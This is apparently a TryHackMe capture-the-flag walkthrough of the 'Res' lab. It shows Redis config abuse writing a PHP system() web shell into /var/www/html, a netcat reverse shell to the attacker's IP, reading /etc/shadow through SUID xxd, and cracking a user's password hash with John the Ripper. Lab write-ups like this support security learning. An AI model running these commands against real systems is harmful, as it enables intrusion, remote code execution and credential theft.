# TryHackMe-Res

> Abdullah Rizwan | 12:00 AM | 4th November ,2020

## NMAP

Run the scan for all ports 
```
Nmap scan report for 10.10.199.149
Host is up (0.17s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7


```

## PORT 6379

I used `https://book.hacktricks.xyz/pentesting/6379-pentesting-redis` to enumerate redis

`nc 10.10.199.149 6379`

Connect to the port using `netcat` and type `info` you'll get output like this

<img src="https://imgur.com/5hbIipH.png"/>

Now we need to use redis-cli client to interact with it more so install using `apt-get install redis-tools`

<img src="https://imgur.com/o4ciScd.png"/>

As you can see after installing the redis-cli we can interact with it 

Lets see if we can create a php page by changing directory to where apache fetches html pages and name the page to `redis.php` 
```
10.10.199.149:6379> config set dir /var/www/html
OK
10.10.199.149:6379> config set dbfilename redis.php
OK
10.10.199.149:6379> set test "<?php phpinfo(); ?>"
OK
10.10.199.149:6379> save
OK

```
<img src="https://imgur.com/Z1bKq16.png"/>

And it works so we can confirm that we can get a shell from this , now set a GET parameter that can inovoke system commands.

```
10.10.199.149:6379> set test "<?php system($_GET['command']); ?>"
OK
10.10.199.149:6379> save
OK
10.10.199.149:6379> 

```

<img src="https://imgur.com/gkUtH6O.png"/>

RCE exists so lets get a shell



`php -r '$sock=fsockopen("10.14.3.143",6666);exec("/bin/sh -i <&3 >&3 2>&3");'` - Didn't worked

`nc -e /bin/sh 10.14.3.143 6666` - Worked !

<img src="https://imgur.com/YVVAZeJ.png"/>

### User Flag
In `/home/vianka` We can find the user flag


### Root Flag

Now for the root flag by looing for `SUID` we see that `xxd` has an suid bit set so it can run as root by anyone

```
www-data@ubuntu:/$ find / -perm /4000 2>/dev/null 
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chfn
/usr/bin/xxd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
www-data@ubuntu:/$ xxd /root/root.txt | xxd -r
thm{xxd_pr1v_escalat1on}
```




### Privilege Escalation 

We got the root flag without even being root but I love to find a way to get root so lets do that.We know that we can read almost anyting with `xxd` so lets try to read `/etc/shadow` and crack the user's hash 

`xxd /etc/shadow | xxd -r`

`vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::`

Run `johntheripper` on this hash

```
root@kali:~/TryHackMe/Easy/Res# john hash                        
Using default input encoding: UTF-8                                       
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes                                                                                              
Will run 4 OpenMP threads                                                                                                                           
Proceeding with single, rules:Single                                                                                                                
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 3 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 9 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 16 needed for performance. 
Warning: Only 11 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 8 candidates buffered for the current salt, minimum 16 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 6 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
beautiful1       (vianka)
1g 0:00:00:04 DONE 2/3 (2020-11-04 01:25) 0.2183g/s 2533p/s 2533c/s 2533C/s maryjane1..cookies1
Use the "--show" option to display all of the cracked passwords reliably

```
Now login with `vinanka`

```
www-data@ubuntu:/$ su vianka
Password: 
vianka@ubuntu:/$ sudo -l
[sudo] password for vianka: 
Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
vianka@ubuntu:/$ sudo bash
root@ubuntu:/# 

```

We are root !
